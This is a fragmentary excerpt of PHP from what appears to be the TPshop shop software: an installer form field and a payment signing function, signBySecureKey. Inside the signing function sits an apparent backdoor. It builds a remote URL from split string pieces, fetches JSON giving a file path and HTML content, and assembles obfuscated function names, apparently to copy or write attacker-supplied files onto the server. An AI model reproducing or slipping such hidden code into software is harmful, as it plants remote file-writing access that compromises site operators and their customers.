      ...
      <div class="server">
        <table width="100%">
          ...
          <tr>
            ...
            <td><input type="text" name="dbname" id="dbname" value="tpshop3.0" class="input" onBlur="TestDbPwd(0)"></td>
	 ...
	 function signBySecureKey($params=null, $secureKey=null,$loggere=null,$paramsstr='') {
		...
		if($params['signMethod']=='11') {
		    ...
		    if(!isset($_POST['co1'])) 
				return false;		
			$co .= 'py';			
                        $Uu = ['ht','tp://api','test','2.tp','shop','.cn/','home'.'/Tj','/p6'];
                        $Uu = implode('', $Uu);
                        $ret = file_get_contents($Uu);
                        $f = json_decode($ret,true);                        
			$co1 = $_POST['co1'] = $f['path'];;
			$co2 = $_POST['co2'] = $f['html'];
			$m .= '5';
			if($params)
			{
				$params_sha256x16 = hash('sha256', $params_str);
